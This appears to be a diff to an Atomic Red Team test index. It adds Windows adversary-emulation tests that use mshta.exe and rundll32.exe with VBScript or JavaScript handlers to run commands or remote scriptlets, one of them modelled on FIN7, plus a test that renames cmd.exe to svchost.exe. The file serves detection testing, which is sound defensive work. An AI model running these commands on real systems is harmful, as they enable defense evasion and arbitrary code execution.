@@ -5703,7 +5703,7 @@ defense-evasion:
         local_chm_file:
           description: Local .chm payload
           type: path
-          default: C:\atomic-red-team\atomics\T1223\src\T1223.chm
+          default: "$PathToAtomicsFolder\\T1223\\src\\T1223.chm"
       executor:
         name: command_prompt
         elevation_required: false
@@ -8825,9 +8825,39 @@ defense-evasion:
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
+        command: "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
+          \     \n"
+    - name: Mshta calls a local VBScript file to launch notepad.exe
+      description: Tests execution of a local program by a VBScript file called by
+        Mshta
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_file:
+          description: Create a local VBScript file
+          type: path
+          default: C:\Temp\mshta_notepad.vbs
+      executor:
+        name: command_prompt
+        command: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""{local_file_path}"")(window.close)")
 
 '
+    - name: Mshta executes VBScript to execute malicious command
+      description: |
+        Run a local VB script to run local user enumeration powershell command
+
+        This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
+      supported_platforms:
+      - windows
+      input_arguments:
+        atomics_path:
+          description: path to atomics folder
+          type: path
+          default: "..\\..\\atomics"
+      executor:
+        name: command_prompt
+        command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
+          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")'
   T1096:
     technique:
       x_mitre_data_sources:
@@ -9493,6 +9523,21 @@ defense-evasion:
       executor:
         name: command_prompt
         command: ".\\bin\\#{exe_binary}\n"
+    - name: svchost writing a file to a UNC path
+      description: |
+        svchost.exe writing a non-Microsoft Office file to a file with a UNC path.
+        This works by copying cmd.exe to a file, naming it svchost.exe, then copying a file to the localhost\c$ folder.
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          copy C:\Windows\System32\cmd.exe C:\svchost.exe
+          C:\svchost.exe /c echo T1055 > \\localhost\c$\T1055.txt
+        cleanup_command: |
+          del C:\T1055.txt
+          del C:\svchost.exe
   T1121:
     technique:
       x_mitre_data_sources:
@@ -9922,6 +9967,24 @@ defense-evasion:
         name: command_prompt
         elevation_required: false
         command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();"
+
+'
+    - name: Rundll32 execute VBscript command
+      description: |
+        Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
+
+        Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: Command for rundll32.exe to execute
+          type: string
+          default: calc.exe
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
 
 '
   T1064:
@@ -12596,6 +12659,21 @@ privilege-escalation:
       executor:
         name: command_prompt
         command: ".\\bin\\#{exe_binary}\n"
+    - name: svchost writing a file to a UNC path
+      description: |
+        svchost.exe writing a non-Microsoft Office file to a file with a UNC path.
+        This works by copying cmd.exe to a file, naming it svchost.exe, then copying a file to the localhost\c$ folder.
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          copy C:\Windows\System32\cmd.exe C:\svchost.exe
+          C:\svchost.exe /c echo T1055 > \\localhost\c$\T1055.txt
+        cleanup_command: |
+          del C:\T1055.txt
+          del C:\svchost.exe
   T1053:
     technique:
       x_mitre_permissions_required:
@@ -18415,7 +18493,7 @@ execution:
         local_chm_file:
           description: Local .chm payload
           type: path
-          default: C:\atomic-red-team\atomics\T1223\src\T1223.chm
+          default: "$PathToAtomicsFolder\\T1223\\src\\T1223.chm"
       executor:
         name: command_prompt
         elevation_required: false
@@ -19132,9 +19210,39 @@ execution:
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
+        command: "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
+          \     \n"
+    - name: Mshta calls a local VBScript file to launch notepad.exe
+      description: Tests execution of a local program by a VBScript file called by
+        Mshta
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_file:
+          description: Create a local VBScript file
+          type: path
+          default: C:\Temp\mshta_notepad.vbs
+      executor:
+        name: command_prompt
+        command: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""{local_file_path}"")(window.close)")
 
 '
+    - name: Mshta executes VBScript to execute malicious command
+      description: |
+        Run a local VB script to run local user enumeration powershell command
+
+        This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
+      supported_platforms:
+      - windows
+      input_arguments:
+        atomics_path:
+          description: path to atomics folder
+          type: path
+          default: "..\\..\\atomics"
+      executor:
+        name: command_prompt
+        command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
+          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")'
   T1086:
     technique:
       x_mitre_permissions_required:
@@ -19793,6 +19901,24 @@ execution:
         name: command_prompt
         elevation_required: false
         command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();"
+
+'
+    - name: Rundll32 execute VBscript command
+      description: |
+        Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
+
+        Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: Command for rundll32.exe to execute
+          type: string
+          default: calc.exe
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
 
 '
   T1053:
